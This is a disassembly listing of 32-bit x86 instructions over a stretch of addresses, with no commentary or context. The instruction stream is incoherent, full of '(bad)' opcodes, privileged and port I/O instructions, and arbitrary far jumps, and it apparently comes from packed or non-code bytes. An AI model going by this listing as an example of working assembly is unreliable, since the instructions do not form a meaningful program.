  418f8a:	fdivr  DWORD PTR [edi+0x7f]
  418f8d:	ficomp WORD PTR [esi]
  418f8f:	out    dx,al
  418f90:	call   0x4f3b4e1c
  418f95:	and    ch,0xf6
  418f98:	pop    ss
  418f99:	mov    WORD PTR [ebp+0x1bd7cf3a],gs
  418f9f:	push   ss
  418fa0:	(bad)  
  418fa1:	fisttp WORD PTR [esi-0x33]
  418fa4:	adc    esi,DWORD PTR [edx-0x76]
  418fa7:	mov    WORD PTR [eax-0x2b],fs
  418faa:	ja     0x418f95
  418fac:	pop    ebx
  418fad:	jmp    0xa9c203ec
  418fb2:	inc    eax
  418fb3:	jns    0x418fd9
  418fb5:	lahf   
  418fb6:	add    BYTE PTR [ebp+0xd78169],0xe3
  418fbd:	cmc    
  418fbe:	mov    WORD PTR [ebp+ecx*2+0x356ce054],ds
  418fc5:	shl    BYTE PTR [eax+0x15339b0f],0xe6
  418fcc:	icebp  
  418fcd:	cwde   
  418fce:	scas   al,BYTE PTR es:[edi]
  418fcf:	(bad)  
  418fd0:	into   
  418fd1:	and    cl,BYTE PTR [ebx+eax*8+0x45]
  418fd5:	sahf   
  418fd6:	jmp    0x419046
  418fd8:	outs   dx,DWORD PTR ds:[esi]
  418fd9:	mov    BYTE PTR [ebp+0x2],0x89
  418fdd:	push   0xffffff92
  418fdf:	and    DWORD PTR [esi-0x59],0x5f70cbc
  418fe6:	inc    ecx
  418fe7:	jns    0x41903f
  418fe9:	push   ecx
  418fea:	sub    cl,BYTE PTR [edx+0x16]
  418fed:	pushf  
  418fee:	mov    al,ds:0xcb4c9cfc
  418ff3:	jmp    0x1c99aca8
  418ff8:	(bad)  
  418ff9:	adc    ebx,DWORD PTR [edi+eax*1]
  418ffc:	into   
  418ffd:	inc    edx
  418ffe:	mov    bl,0x99
  419000:	xchg   esp,eax
  419001:	mov    ah,0xf2
  419003:	xchg   ebp,eax
  419004:	cmp    al,0x47
  419006:	ins    BYTE PTR es:[edi],dx
  419007:	push   ecx
  419008:	stos   DWORD PTR es:[edi],eax
  419009:	push   edi
  41900a:	out    0xd3,eax
  41900c:	mov    edi,0x2113b4f0
  419011:	(bad)  
  419012:	iret   
  419013:	push   esi
  419014:	dec    ebx
  419015:	lods   al,BYTE PTR ds:[esi]
  419016:	and    bh,BYTE PTR [edi+0x49540b3c]
  41901c:	inc    ecx
  41901d:	adc    cl,cl
  41901f:	in     al,0x2d
  419021:	out    0xbe,eax
  419023:	add    DWORD PTR [eax],0xffffffaf
  419026:	ss xchg esp,eax
  419028:	gs cli 
  41902a:	repnz push ds
  41902c:	loope  0x418fdd
  41902e:	mov    ah,0xd8
  419030:	inc    esp
  419031:	dec    ebp
  419032:	repz xor eax,0xc3218549
  419038:	mov    ds:0xc1bb5134,eax
  41903d:	stc    
  41903e:	cmp    ch,bl
  419040:	shl    esi,cl
  419042:	mov    dh,0xa4
  419044:	popf   
  419045:	stos   DWORD PTR es:[edi],eax
  419046:	add    BYTE PTR [esi-0x49],bh
  419049:	xor    bl,BYTE PTR [edx-0x195f3867]
  41904f:	xor    eax,0xfa423216
  419054:	push   ss
  419055:	in     eax,dx
  419056:	xchg   ebx,eax
  419057:	inc    esi
  419058:	ins    DWORD PTR es:[edi],dx
  419059:	jp     0x419010
  41905b:	fwait
  41905c:	sti    
  41905d:	and    al,BYTE PTR [ecx]
  41905f:	inc    esp
  419060:	push   edx
  419061:	imul   DWORD PTR [eax+0x70]
  419064:	(bad)  
  419065:	stos   DWORD PTR es:[edi],eax
  419066:	push   ebp
  419067:	and    ecx,0x1adf1ffb
  41906d:	mov    ebp,0x9aee0f49
  419072:	popf   
  419073:	inc    edx
  419074:	imul   ecx,DWORD PTR fs:[eax-0x41],0xffffffb5
  419079:	mov    esi,0x3141ec61
  41907e:	xor    edi,DWORD PTR [edi-0x6d]
  419081:	mov    edi,0x7412ef48
  419086:	rcl    BYTE PTR [edx],cl
  419088:	pop    ds
  419089:	xor    al,dl
  41908b:	scas   al,BYTE PTR es:[edi]
  41908c:	mov    ecx,0xc2ed02ea
  419091:	(bad)  
  419092:	ret    
  419093:	ret    0x2434
  419096:	cmp    eax,0x2edfcd54
  41909b:	pop    ecx
  41909c:	inc    esi
  41909d:	out    0xda,al
  41909f:	push   edi
  4190a0:	lods   eax,DWORD PTR ds:[esi]
  4190a1:	mov    ch,0x43
  4190a3:	addr16 push cs
  4190a5:	arpl   WORD PTR [ebp-0x22ace497],bx
  4190ab:	test   al,0xdd
  4190ad:	pop    ss
  4190ae:	cmp    esi,DWORD PTR [ebx+edi*2-0x60]
  4190b2:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190b4:	test   edi,eax
  4190b6:	sbb    al,0x63
  4190b8:	mov    al,0xee
  4190ba:	inc    eax
  4190bb:	into   
  4190bc:	loope  0x4190d9
  4190be:	inc    DWORD PTR [ecx-0x19]
  4190c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190c2:	ins    BYTE PTR es:[edi],dx
  4190c3:	jnp    0x4190cf
  4190c5:	pusha  
  4190c6:	cmp    dl,dl
  4190c8:	pop    ebp
  4190c9:	pop    ebx
  4190ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190cb:	push   es
  4190cc:	(bad)  
  4190cd:	data16 add BYTE PTR [esp+edx*1+0x17],dh
  4190d2:	mov    ch,BYTE PTR [ecx-0x3848c518]
  4190d8:	ret    0xbee5
  4190db:	scas   al,BYTE PTR es:[edi]
  4190dc:	sbb    eax,0xc3c67e25
  4190e1:	out    dx,al
  4190e2:	fstp   QWORD PTR [eax+0x45]
  4190e5:	push   edx
  4190e6:	inc    esp
  4190e7:	adc    BYTE PTR [ecx],ch
  4190e9:	push   ecx
  4190ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190eb:	call   0xdcc0d7a2
  4190f0:	push   esp
  4190f1:	inc    ebx
  4190f2:	lea    ecx,[edx]
  4190f4:	fst    QWORD PTR [edx]
  4190f6:	pushf  
  4190f7:	hlt    
  4190f8:	jmp    0x41912c
  4190fa:	mov    ecx,0x7a09b686
  4190ff:	cmp    BYTE PTR [edx-0x10a06fa1],al
  419105:	sbb    ebx,DWORD PTR [esp+eax*1+0x2a]
  419109:	jg     0x419118
  41910b:	xchg   ebx,eax
  41910c:	jnp    0x419144
  41910e:	jmp    0x8dce238f
  419113:	inc    esp
  419114:	mov    ebp,0xe666a73d
  419119:	pop    ebp
  41911a:	dec    ebp
  41911b:	ficomp DWORD PTR [ecx]
  41911d:	or     DWORD PTR [ecx-0x51cb7017],esi
  419123:	add    eax,0x2db961bf
  419128:	push   edi
  419129:	js     0x41918a
  41912b:	jbe    0x4190d8
  41912d:	mov    ebp,0x5b890e5b
  419132:	add    esp,eax
  419134:	iret   
  419135:	rol    dl,cl
  419137:	jmp    0xfced5332
  41913c:	imul   ebp,ebp,0x72652815
  419142:	jmp    DWORD PTR [eax-0x6d970933]
  419148:	iret   
  419149:	jge    0x419132
  41914b:	mov    es,WORD PTR [esi-0x2438f79a]
  419151:	push   es
  419152:	popa   
  419153:	cmp    DWORD PTR [ebp-0x916df0],esi
  419159:	mov    eax,ds:0xe7af9ee1
  41915e:	add    BYTE PTR [ecx-0x787fd849],bl
  419164:	add    cl,BYTE PTR [edi-0x9]
  419167:	dec    ecx
  419168:	pop    edx
  419169:	jno    0x419121
  41916b:	xor    DWORD PTR [esi+0x0],esi
  41916e:	sar    dx,0xc1
  419172:	cmc    
  419173:	add    BYTE PTR [edi+0x54],bl
  419176:	mov    WORD PTR [edi+0x72287bb9],gs
  41917c:	ins    DWORD PTR es:[edi],dx
  41917d:	ffree  st(0)
  41917f:	mov    edi,0xbd8aed34
  419184:	ins    BYTE PTR es:[edi],dx
  419185:	jbe    0x4191b8
  419187:	mov    ds:0x49cd3ab9,al
  41918c:	mov    ecx,0x215ce6eb
  419191:	mov    BYTE PTR ds:0x3538e7db,0x73
  419198:	out    0xa8,eax
  41919a:	scas   al,BYTE PTR es:[edi]
  41919b:	test   ebp,ebp
  41919d:	test   DWORD PTR [ebp+0x5346c33d],0x5e395c72
  4191a7:	dec    BYTE PTR [esp+eax*8+0x68ecfa0f]
  4191ae:	ins    BYTE PTR es:[edi],dx
  4191af:	ror    BYTE PTR [ebp+0x4f699a87],0x23
  4191b6:	(bad)  
  4191b7:	xor    al,0x12
  4191b9:	push   edx
  4191ba:	push   ds
  4191bb:	aas    
  4191bc:	push   0x3457a7bf
  4191c1:	sti    
  4191c2:	loopne 0x419159
  4191c4:	mov    cx,0xb0f8
  4191c8:	pop    ds
  4191c9:	xchg   edx,eax
  4191ca:	(bad)  
  4191cb:	(bad)  
  4191cc:	push   ebx
  4191cd:	stos   DWORD PTR es:[edi],eax
  4191ce:	jg     0x41917f
  4191d0:	mov    dh,0x26
  4191d2:	into   
  4191d3:	pop    esi
  4191d4:	mov    ch,0x6b
  4191d6:	adc    DWORD PTR [ebp-0x4b],edi
  4191d9:	test   BYTE PTR [edi+edx*1],al
  4191dc:	icebp  
  4191dd:	enter  0x9e97,0xc0
  4191e1:	iret   
  4191e2:	adc    BYTE PTR [edi-0x3d07a889],dl
  4191e8:	mov    eax,0x15370eaa
  4191ed:	pop    ds
  4191ee:	jnp    0x4191fc
  4191f0:	push   ebp
  4191f1:	and    bh,BYTE PTR [eax]
  4191f3:	mov    dh,0xf6
  4191f5:	or     eax,DWORD PTR [eax-0x62]
  4191f8:	(bad)
  4191fd:	xlat   BYTE PTR ds:[ebx]
  4191fe:	cmp    BYTE PTR [ebp-0x1ac04378],ch
  419204:	jnp    0x41922b
  419206:	mov    ds:0x5ebbe9b0,eax
  41920b:	and    al,0xd5
  41920d:	scas   eax,DWORD PTR es:[edi]
  41920e:	daa    
  41920f:	(bad)
  419214:	popa   
  419215:	call   0x5d0676a4
  41921a:	rol    eax,1
  41921c:	jg     0x4191b3
  41921e:	call   0x3972c10f
  419223:	or     al,BYTE PTR [esi]
  419225:	sbb    eax,0x6031ddbc
  41922a:	daa    
  41922b:	pushf  
  41922c:	es adc eax,0x15a4bdeb
  419232:	inc    edi
  419233:	in     eax,0x6b
  419235:	aaa    
  419236:	test   al,0x8f
  419238:	mov    ds,WORD PTR [esi+0x75]
  41923b:	mov    BYTE PTR [ebx-0x2],0x8d
  41923f:	imul   edi,esp,0xd3646a57
  419245:	fimul  WORD PTR [eax+0x5ba4ef6f]
  41924b:	nop
  41924c:	or     eax,0x5838967d
  419251:	shl    DWORD PTR [edx+0x56],cl
  419254:	mov    ch,BYTE PTR [eax]
  419256:	inc    ecx
  419257:	add    eax,0xc84b7b45
  41925c:	out    0xfa,al
  41925e:	pop    edx
  41925f:	test   DWORD PTR [ebp+0x6943a13a],esp
  419265:	ss leave 
  419267:	retf   0x1225
  41926a:	xchg   BYTE PTR [edi],dh
  41926c:	xor    cl,dh
  41926e:	stc    
  41926f:	shl    BYTE PTR [edx],1
  419271:	aam    0x3d
  419273:	ds pop ebx
  419275:	pop    es
  419276:	inc    edi
  419277:	jp     0x419238
  419279:	or     DWORD PTR [esp+ebp*4-0x5a],edx
  41927d:	pushf  
  41927e:	mov    ebx,0x43767559
  419283:	jo     0x419268
  419285:	push   eax
  419286:	xchg   DWORD PTR [eax-0x68],edi
  419289:	jmp    0x770fed97
  41928e:	jmp    0xa865286c
  419293:	imul   ecx,DWORD PTR [edx+0x70],0x49
  419297:	or     al,0x46
  419299:	jne    0x419286
  41929b:	jmp    0xd296:0x411d3790
  4192a2:	push   ebp
  4192a3:	push   edi
  4192a4:	xor    eax,0xdb8c0e3e
  4192a9:	popf   
  4192aa:	sbb    BYTE PTR [ebp-0x5d70690e],cl
  4192b0:	inc    esi
  4192b1:	test   BYTE PTR [ecx-0x4b],ch
  4192b4:	adc    al,0xf3
  4192b6:	scas   al,BYTE PTR es:[edi]
  4192b7:	imul   ecx,DWORD PTR [ebx-0x1e],0xd41acb45
  4192be:	lods   eax,DWORD PTR ds:[esi]
  4192bf:	cdq    
  4192c0:	xor    ebx,esp
  4192c2:	sub    al,0x55
  4192c4:	xor    bh,bh
  4192c6:	mov    DWORD PTR [ebp+0x1bbdd63e],edx
  4192cc:	cmp    eax,0x3bbdf21b
  4192d1:	jno    0x4192c0
  4192d3:	scas   al,BYTE PTR es:[edi]
  4192d4:	lock pushf 
  4192d6:	int    0x37
  4192d8:	in     eax,dx
  4192d9:	out    0x3,eax
  4192db:	gs jo  0x4192c9
  4192de:	sub    ebx,DWORD PTR [eax+eax*4+0x3dca9a14]
  4192e5:	leave  
  4192e6:	les    eax,FWORD PTR [ecx-0x3f]
  4192e9:	call   0x7e84c6a1
  4192ee:	js     0x41930d
  4192f0:	bound  edx,QWORD PTR [edx+0x6f]
  4192f3:	dec    edx
  4192f4:	pop    esp
  4192f5:	cld    
  4192f6:	outs   dx,BYTE PTR ds:[esi]
  4192f7:	adc    eax,0x60b5eac
  4192fc:	and    al,0x60
  4192fe:	sbb    al,0xc
  419300:	push   ds
  419301:	mov    esi,DWORD PTR [edx]
  419303:	sahf   
  419304:	fmul   QWORD PTR [edx]
  419306:	jnp    0x4192b8
  419308:	popa   
  419309:	cmp    al,0xd1
  41930b:	or     al,0x89
  41930d:	dec    esi
  41930e:	inc    eax
  41930f:	or     DWORD PTR [edx+0x7a],0xffffffd5
  419313:	dec    esp
  419314:	mov    al,0x8f
  419316:	pop    edx
  419317:	dec    esi
  419318:	cwde   
  419319:	lea    esi,[edi+0x1eb2598d]
  41931f:	pop    ecx
  419320:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419321:	scas   al,BYTE PTR es:[edi]
  419322:	popa   
  419323:	popf   
  419324:	out    dx,al
  419325:	bound  esi,QWORD PTR [edx-0x550e4a6c]
  41932b:	or     ebx,ebp
  41932d:	stc    
  41932e:	mov    edx,0xe5d6857e
  419333:	cmp    al,0xa4
  419335:	into   
  419336:	adc    esp,DWORD PTR [eax+0x73587c40]
  41933c:	xchg   esp,eax
  41933d:	inc    edi
  41933e:	mov    ds:0xd91ddf7e,al
  419343:	neg    BYTE PTR [esi-0x2f]
  419346:	mov    bl,0xc6
  419348:	xor    eax,0x554c012f
  41934d:	or     BYTE PTR [ecx],al
  41934f:	cmp    esi,0xdff0143f
  419355:	add    al,0xd5
  419357:	test   DWORD PTR [ecx],edx
  419359:	fsubr  st,st(2)
  41935b:	or     bh,BYTE PTR [ebp-0x18]
  41935e:	(bad)  
  41935f:	rol    DWORD PTR [eax+0x4],1
  419362:	add    esp,eax
  419364:	jmp    0x7e7b:0x490db673
  41936b:	and    edi,ecx
  41936d:	dec    eax
  41936e:	cli    
  41936f:	mov    edi,0x4925cdbe
  419374:	mov    ebp,0xae9af26b
  419379:	cmp    DWORD PTR [ecx-0x30],eax
  41937c:	sti    
  41937d:	xchg   edx,eax
  41937e:	jo     0x41930d
  419380:	push   ebp
  419381:	sar    DWORD PTR [esi],1
  419383:	cwde   
  419384:	cmp    eax,0x7ea2a8d
  419389:	rcr    BYTE PTR [eax+0x4d21531e],0x63
  419390:	pushf  
  419391:	mov    eax,ds:0x6da9972d
  419396:	mov    edx,0x6d0c467e
  41939b:	pop    esi
  41939c:	pop    ecx
  41939d:	and    esi,DWORD PTR [ebx+0x9]
  4193a0:	leave  
  4193a1:	jge    0x4193f7
  4193a3:	lea    ebp,[edi-0x60ee0083]
  4193a9:	ret    
  4193aa:	stos   DWORD PTR es:[edi],eax
  4193ab:	add    eax,0xd3c8b222
  4193b0:	in     al,dx
  4193b1:	push   edx
  4193b2:	jle    0x4193f9
  4193b4:	cmp    al,ch
  4193b6:	aam    0xe5
  4193b8:	push   ecx
  4193b9:	das    
  4193ba:	enter  0x40a,0x8e
  4193be:	int3   
  4193bf:	inc    si
  4193c1:	mov    edx,DWORD PTR [ebx+ecx*2-0x5a]
  4193c5:	es pop ss
  4193c7:	xchg   edx,eax
  4193c8:	dec    esi
  4193c9:	jb     0x4193af
  4193cb:	fild   QWORD PTR [edi+esi*4-0x54e2158a]
  4193d2:	stos   BYTE PTR es:[edi],al
  4193d3:	or     DWORD PTR [ecx],ebp
  4193d5:	ret    
  4193d6:	ins    BYTE PTR es:[edi],dx
  4193d7:	adc    esp,0x64109b83
  4193dd:	adc    al,0x68
  4193df:	inc    ebx
  4193e0:	out    dx,eax
  4193e1:	add    esp,DWORD PTR [ecx-0x3a]
  4193e4:	ret    
  4193e5:	cmp    al,0x79
  4193e7:	inc    esi
  4193e8:	(bad)  
  4193e9:	hlt    
  4193ea:	mov    ch,0xb
  4193ec:	aad    0x9f
  4193ee:	mov    esp,0xe14f03fb
  4193f3:	push   cs
  4193f4:	push   ebp
  4193f5:	dec    esp
  4193f6:	sub    DWORD PTR [eax+0x666a8c0c],ebx
  4193fc:	sbb    bl,BYTE PTR [eax-0x732e3b8b]
  419402:	xor    BYTE PTR ds:0xc420,dh
  419407:	dec    edx
  419408:	mov    edi,0x69a0d06e
  41940d:	jns    0x41946d
  41940f:	shl    edi,1
  419411:	dec    edx
  419412:	stos   DWORD PTR es:[edi],eax
  419413:	ja     0x4193da
  419415:	jmp    0x26eaa92
  41941a:	adc    ch,BYTE PTR [ebx]
  41941c:	adc    esp,DWORD PTR [edx+0x42a994fe]
  419422:	pop    ebx
  419423:	xor    esp,DWORD PTR [edx-0x7]
  419426:	mov    edx,0x4eba1fdf
  41942b:	jmp    0xee18:0x35c090d5
  419432:	inc    edx
  419433:	xor    ebp,DWORD PTR [ebp+0x77]
  419436:	or     al,bh
  419438:	(bad)  
  419439:	dec    ebp
  41943a:	sbb    BYTE PTR es:[ecx-0x9],dh
  41943e:	test   edi,ecx
  419440:	ds xchg esi,eax
  419442:	ret    0xde1b
  419445:	xlat   BYTE PTR ds:[ebx]
  419446:	jge    0x4194a6
  419448:	fsub   QWORD PTR [esi+0x59]
  41944b:	cmp    al,0xbd
  41944d:	sub    BYTE PTR ds:0x3a2c9d57,al
  419453:	xor    eax,DWORD PTR [edx]
  419455:	sub    DWORD PTR [ebx],esp
  419457:	retf   0x72a8
  41945a:	mov    ds,WORD PTR [edx+0x1d]
  41945d:	repnz push eax
  41945f:	cmp    al,0x2f
  419461:	mov    bl,0x28
  419463:	fdiv   DWORD PTR [ebp-0xf]
  419466:	(bad)  [ecx]
  419468:	iret   
  419469:	retf   0xcf39
  41946c:	xor    al,BYTE PTR [edx-0xa3ea3d0]
  419472:	cs inc eax
  419474:	int    0xe4
  419476:	add    cl,BYTE PTR [eax+0x68a35e06]
  41947c:	mov    esi,0xf550d502
  419481:	dec    eax
  419482:	jmp    0xc207:0xd96b88e4
  419489:	mov    ecx,0xc50e5dc1
  41948e:	repnz shl DWORD PTR [edx-0x12],1
  419492:	test   eax,0x7ea52593
  419497:	stos   BYTE PTR es:[edi],al
  419498:	lock and BYTE PTR ds:0xc4566738,bh
  41949f:	bnd jp 0x4194bf
  4194a2:	cwde   
  4194a3:	mov    ah,0x91
  4194a5:	cli    
  4194a6:	in     eax,dx
  4194a7:	test   BYTE PTR [edi-0x1b1ee8cb],al
  4194ad:	xchg   ebp,eax
  4194ae:	test   eax,0x798dbb88
  4194b3:	rcr    DWORD PTR [edi+0x54e30c05],0x4e
  4194ba:	enter  0xca77,0x0
  4194be:	xchg   ebp,eax
  4194bf:	xlat   BYTE PTR ds:[ebx]
  4194c0:	neg    BYTE PTR [ecx]
  4194c2:	ret    
  4194c3:	inc    edi
  4194c4:	jge    0x419453
  4194c6:	or     DWORD PTR [eax],edx
  4194c8:	nop
  4194c9:	imul   esi
  4194cb:	fcmovb st,st(6)
  4194cd:	les    esi,FWORD PTR [esi+ebx*8]
  4194d0:	jecxz  0x41948d
  4194d2:	popa   
  4194d3:	xchg   BYTE PTR [ecx],cl
  4194d5:	fnstcw WORD PTR [esi]
  4194d7:	mov    esp,0x866b7aa1
  4194dc:	fxch   st(4)
  4194de:	cmp    edx,DWORD PTR [edx+0x64]
  4194e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194e2:	lds    ebx,FWORD PTR ss:[ebp-0x58fb848a]
  4194e9:	jae    0x41947f
  4194eb:	mov    dh,0xa2
  4194ed:	pop    esi
  4194ee:	sti    
  4194ef:	and    DWORD PTR [edi-0x3c],edi
  4194f2:	inc    ecx
  4194f3:	jne    0x41952e
  4194f5:	sub    al,0x40
  4194f7:	lods   al,BYTE PTR ds:[esi]
  4194f8:	adc    DWORD PTR [edi+0x68],edi
  4194fb:	mov    edi,0x44b02bbf
  419500:	(bad)  
  419501:	test   BYTE PTR [ebp-0x31056fc1],bl
  419507:	out    0x95,al
  419509:	add    al,0x68
  41950b:	jge    0x4194f4
  41950d:	lock mov eax,ds:0x79cb3dac
  419513:	test   eax,0xd3ced0c7
  419518:	aam    0xd1
  41951a:	inc    eax
  41951b:	xor    bl,BYTE PTR [esi]
  41951d:	es call 0x2815:0x143fbb81
  419525:	mov    ebx,0x60937c0c
  41952a:	add    bh,bl
  41952c:	mov    ecx,esi
  41952e:	xchg   edi,eax
  41952f:	jecxz  0x419561
  419531:	call   0xc45b:0x9c93fb52
  419538:	outs   dx,DWORD PTR ds:[esi]
  419539:	dec    esp
  41953a:	mov    cl,0xa5
  41953c:	repnz or al,0x3b
  41953f:	jg     0x4194fb
  419541:	out    0xad,al
  419543:	fwait
  419544:	pop    edx
  419545:	adc    DWORD PTR [ecx-0x60952e12],esi
  41954b:	aas    
  41954c:	ss daa 
  41954e:	sbb    eax,DWORD PTR [ebp+0x1f010da7]
  419554:	adc    ebx,eax
  419556:	xchg   DWORD PTR [eax+0x58],esp
  419559:	jle    0x41952b
  41955b:	mov    ch,0x8c
  41955d:	out    0x69,al
  41955f:	std    
  419560:	or     BYTE PTR [esi+0x56],0x5b
  419564:	cmp    ch,BYTE PTR [ebp+eax*8+0x5b]
  419568:	jecxz  0x419519
  41956a:	les    esi,FWORD PTR [eax-0x1e]
  41956d:	aaa    
  41956e:	fisub  DWORD PTR [ebp+0x46]
  419571:	xchg   ecx,eax
  419572:	ret    0xb261
  419575:	cmp    al,0xd3
  419577:	lds    ebx,FWORD PTR [ecx+0x3a7e9acc]
  41957d:	and    cl,BYTE PTR [esp+eax*4+0x647ee03f]
  419584:	jb     0x419565
  419586:	pop    ds
  419587:	out    dx,al
  419588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419589:	mov    al,ds:0x5008c081
  41958e:	push   ebx
  41958f:	jno    0x41958a
  419591:	xchg   dl,dl
  419593:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419594:	add    esi,DWORD PTR [ecx]
  419596:	sbb    bh,BYTE PTR [ecx]
  419598:	pop    esp
  419599:	dec    ecx
  41959a:	push   ds
  41959b:	nop
  41959c:	retf   
  41959d:	ins    DWORD PTR es:[edi],dx
  41959e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41959f:	test   BYTE PTR [edi-0x76150d13],cl
  4195a5:	repnz (bad) 
  4195a8:	xor    BYTE PTR [eax+esi*2],bh
  4195ab:	pop    ebx
  4195ac:	lods   eax,DWORD PTR ds:[esi]
  4195ad:	push   esi
  4195ae:	push   edi
  4195af:	mov    fs,WORD PTR ds:0x2280acc5
  4195b5:	cmp    DWORD PTR [ebx+edi*1],0x39
  4195b9:	sbb    DWORD PTR [esp+eax*4],eax
  4195bc:	jne    0x419630
  4195be:	xchg   DWORD PTR [ebp+0xbaad30a],ecx
  4195c4:	ss inc edx
  4195c6:	fsubp  st(4),st
  4195c8:	sub    al,0x15
  4195ca:	or     edi,ebx
  4195cc:	jp     0x41955d
  4195ce:	das    
  4195cf:	ja     0x4195e0
  4195d1:	or     al,BYTE PTR [ebx+0x29]
  4195d4:	pop    esp
  4195d5:	(bad)  
  4195d6:	cmp    eax,0x6bcabce6
  4195db:	xor    ebx,DWORD PTR [edx]
  4195dd:	push   ebx
  4195de:	in     eax,0xa1
  4195e0:	push   0x1c
  4195e2:	and    al,0xe7
  4195e4:	pop    esp
  4195e5:	dec    edx
  4195e6:	add    al,0x9
  4195e8:	imul   ebx,DWORD PTR [ebx+0x338cd16a],0x1c2c4388
  4195f2:	sub    ecx,ebx
  4195f4:	cs cmp al,0xec
  4195f7:	ret    
  4195f8:	sar    DWORD PTR [edx],cl
  4195fa:	add    BYTE PTR [edx-0x433b908d],0xdd
  419601:	stos   BYTE PTR es:[edi],al
  419602:	cwde   
  419603:	adc    edx,DWORD PTR [edx]
  419605:	mov    ch,0xbf
  419607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419608:	sub    al,0x3a
  41960a:	push   edi
  41960b:	dec    edx
  41960c:	jb     0x419663
  41960e:	sahf   
  41960f:	ret    
  419610:	sar    BYTE PTR [ebp+0x79d5d5b7],cl
  419616:	int3   
  419617:	xor    dl,BYTE PTR [edi]
  419619:	arpl   WORD PTR [eax+0x9e97172],ax
  41961f:	test   eax,0x3fb4498f
  419624:	fst    DWORD PTR [ecx-0x3f]
  419627:	out    0xff,eax
  419629:	sub    BYTE PTR [ebx-0x43847ff],bl
  41962f:	int3   
  419630:	movs   BYTE PTR es:[di],BYTE PTR cs:[si]
  419633:	xor    al,0xea
  419635:	and    BYTE PTR [ecx-0x3c],al
  419638:	fistp  WORD PTR [ebx-0x3dbda833]
  41963e:	xchg   esp,eax
  41963f:	retf   0x6cab
  419642:	test   DWORD PTR [ebx+0x5b2ff4c5],0x22fe8c41
  41964c:	ins    BYTE PTR es:[edi],dx
  41964d:	mov    ds:0x636f3b70,al
  419652:	in     al,0xf6
  419654:	xchg   ebp,eax
  419655:	add    al,0xab
  419657:	jge    0x419687
  419659:	ret    
  41965a:	test   al,0xd
  41965c:	xchg   dl,cl
  41965e:	fldenv [ebx*4-0xff9a2aa]
  419665:	pop    eax
  419666:	mov    ch,0x10
  419668:	pop    esp
  419669:	aaa    
  41966a:	shl    BYTE PTR [esi-0x4ed13df7],1
  419670:	mov    ebx,0x552d540d
  419675:	add    DWORD PTR [edx-0x73cf1348],ebp
  41967b:	test   cl,0x33
  41967e:	xchg   ecx,eax
  41967f:	test   eax,0xc1ca936f
  419684:	stc    
  419685:	mov    edi,0x54b26497
  41968a:	inc    ecx
  41968b:	mov    dl,0x99
  41968d:	and    BYTE PTR [ecx+esi*4],dl
  419690:	(bad)
  419694:	aam    0x9c
  419696:	push   edi
  419697:	mov    ebx,0x1b0b7d0d
  41969c:	and    ah,0x8d
  41969f:	and    eax,0x78f83a2b
  4196a4:	cmp    BYTE PTR [esi-0x80],cl
  4196a7:	xchg   ebp,eax
  4196a8:	xor    BYTE PTR [ebx+0x46],0x53
  4196ac:	xor    ch,BYTE PTR [edi-0x36637a7a]
  4196b2:	sbb    al,0xe2
  4196b4:	rcr    DWORD PTR [ecx-0x2d577874],1
  4196ba:	mov    ebp,DWORD PTR [esi]
  4196bc:	retf   0x99c5
  4196bf:	add    DWORD PTR [esi-0x17],ebp
  4196c2:	test   ch,0xd5
  4196c5:	sbb    al,0x13
  4196c7:	jle    0x41972f
  4196c9:	cdq    
  4196ca:	les    eax,FWORD PTR [edi]
  4196cc:	jecxz  0x41969e
  4196ce:	and    al,0xb3
  4196d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196d1:	into   
  4196d2:	cld    
  4196d3:	rcr    DWORD PTR [edi+0x5a],0x23
  4196d7:	xchg   ebx,eax
  4196d8:	inc    eax
  4196d9:	mov    edx,0xd83af102
  4196de:	jecxz  0x41969d
  4196e0:	jge    0x419697
  4196e2:	sar    DWORD PTR [edx+0x4a89f9f3],0x41
  4196e9:	inc    ebp
  4196ea:	jmp    0xe7:0x5b24202f
  4196f1:	cli    
  4196f2:	or     ah,ch
  4196f4:	xchg   DWORD PTR [esi+0x17],esp
  4196f7:	add    BYTE PTR [ebx],0x9b
  4196fa:	mov    eax,edx
  4196fc:	hlt    
  4196fd:	aas    
  4196fe:	inc    edi
  4196ff:	add    eax,0x417f312b
  419704:	mov    dh,0x7
  419706:	mov    DWORD PTR [ebx+0x4f9d6beb],ebx
  41970c:	mov    BYTE PTR [ebx-0x45],dh
  41970f:	xchg   esp,eax
  419710:	out    dx,eax
  419711:	jmp    0x419738
  419713:	jbe    0x419778
  419715:	mov    ah,0x4e
  419717:	fs xor eax,0xe00f76ea
  41971d:	dec    esp
  41971e:	fld    TBYTE PTR [esi]
  419720:	outs   dx,BYTE PTR ds:[esi]
  419721:	(bad)  
  419722:	sbb    eax,0x93cc2756
  419727:	lahf   
  419728:	bound  edi,QWORD PTR [edi-0x12]
  41972b:	sahf   
  41972c:	mov    ebx,0x37ab716a
  419731:	jns    0x4196cc
  419733:	mov    edx,0x4dcf474
  419738:	enter  0xafae,0x4f
  41973c:	mov    edx,0x5698a6ed
  419741:	cli    
  419742:	dec    edx
  419743:	loope  0x419716
  419745:	daa    
  419746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419747:	xor    DWORD PTR [ebp-0x1f],ecx
  41974a:	mov    ch,ah
  41974c:	lods   al,BYTE PTR ds:[esi]
  41974d:	je     0x4196ec
  41974f:	ret    0x3a92
  419752:	ja     0x4196de
  419754:	popf   
  419755:	ja     0x4196ec
  419757:	psubusw mm7,QWORD PTR [edi-0x75b0f56b]
  41975e:	fnstenv [ecx+0xf2c83ac]
  419764:	mov    ah,0x50
  419766:	sub    eax,0xee518a28
  41976b:	mov    edi,0xe74e3fab
  419770:	jle    0x4197c4
  419772:	or     esi,DWORD PTR [eax-0x1ebbc1d8]
  419778:	int    0xc7
  41977a:	cmp    ebp,eax
  41977c:	(bad)  [ebp-0x3c]
  41977f:	sub    edx,DWORD PTR [esi+ebp*1-0x381f7b20]
  419786:	jae    0x419751
  419788:	jo     0x4197bb
  41978a:	das    
